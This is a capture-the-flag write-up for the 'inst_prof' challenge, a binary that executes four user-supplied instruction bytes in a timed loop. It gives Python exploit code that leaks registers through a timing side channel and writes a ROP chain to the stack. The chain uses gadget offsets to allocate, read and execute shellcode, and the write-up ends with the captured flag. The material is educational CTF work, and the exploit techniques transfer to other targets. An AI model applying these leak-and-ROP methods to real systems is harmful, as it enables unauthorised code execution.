# inst_prof

This challenge accepts 4 Bytes of Instructions and executes them in a tight loop, returning the runtime.
The do_test function is called in a while-true loop.
The Pseudocode looks as follows:

```c
void read_inst(void *page)
{
    read_n(page, 4);
}

void do_test()
{
    void *page = alloc_page()
    read_inst(page); //Insert 4 Bytes from User into a Template
    make_page_executable(page)

    r12 = rdtsc;
    ((void (*)())page)();
    rdx = rdtsc - r12;

    write(1, rdx, 8);
    free_page(page);
}
```

The disassembly of the Template:

```assembly
mv ecx, 0x1000
your_code:
<your 4 bytes>
sub ecx, 1
jne your_code
ret
```

## Leaking Stuff
First of all we noticed, that the registers r14 and r15 are not altered between two iterations.
This allows to preserve minimal state between two executions.
To leak registers, we stored the value to leak in r15 and extracted the value bit by bit.

```python
def leak_r15(lowest_bit=0, highest_bit=48):
    #skip not needed bits
    for n_bit in range(0, lowest_bit):
        execute("shr r15,1; ret")

    #leak
    leak = 0
    for n_bit in range(lowest_bit, highest_bit+1):
        #prepare bit mask
        execute("xor r14, r14")
        execute("inc r14; ret")
        execute("and r14, r15")

        #leak
        t = execute("sub r12, r14")
        if t > thres:
            leak |= 1 << n_bit

        #shfit r15
        execute("shr r15,1; ret")

    return leak
```

As r12 holds the start timestamp, the returned runtime can be artificialy increased depending on r14.
The time difference between 0 and 1 bits is roughly factor 2.
Even though, as we only use one attempt to read a bit (without averagig) to reduce the toal runtime, this attemp of leaking fails sometimes.


## Writing to Stack
To prepare a ropchain, we need to write arbitrary data to Stack.
The address we want to write to is stored in r15.
```python
def write_buff(what):
    for c in what:
        execute("movb [r15],0x%02x" % ord(c))
        execute("inc r15; ret")
```

## Exploit
The binary already contains lots of nice gadgets, such as alloc_page, read_n and make_page executable.
First we have to leak the address of the old Page and of course the binary base address for the ROP gadgets.

```python
execute("pop r15; push r15")
binary_base = leak_r15(lowest_bit=12,highest_bit=40) | 0x550000000000

execute("mov r15, rdi")
page_old = leak_r15(lowest_bit=12,highest_bit=48)
```

Then we prepare the rop chain.
We used the gadgets to allocate a new page, read arbitrary data and execute it.
rsi already contains 0x1000, the size of one page, what was usefull for alloc_page and read_n.
As the behavior for mmap is deterministic, we can compute the address of the newly allocated page from the previous allocated one.

```python
alloc_page = binary_base + 0x9f0
pop_rdi = binary_base + 0xbc3
read_n = binary_base + 0xa80
make_page_executable = binary_base + 0xa20
pop_rbx_r12_rbp = binary_base + 0xaab
call_rbx = binary_base + 0xb16

ropchain  = struct.pack("<Q", alloc_page)
ropchain += struct.pack("<Q", pop_rdi)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", read_n)
ropchain += struct.pack("<Q", pop_rdi)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", make_page_executable)
ropchain += struct.pack("<Q", pop_rbx_r12_rbp)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", call_rbx)
```

To write the ropchain without crashing the programm, we used rsp+0x1000 as a target and placed it in front of the mains stack frame.

```python
execute("mov %r15, %rsp; ret")
execute("inc %r15")
write_buff(ropchain)
```

Then we write the address of the ROP chain to rsp to trigger the execution.
```python
execute("mov r15, rsp; ret")
execute("inc r15")
CODE = asm("mov rsp,r15; ret").ljust(4, asm("nop"))
con.send(CODE)
con.send(shellcode)
con.send("cat flag.txt\n")
```

After some attempts, the Flag shows up:
```
CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}
```

# Files
- [Patched binary](patched_inst_prof)
- [Exploit](exploit.py)
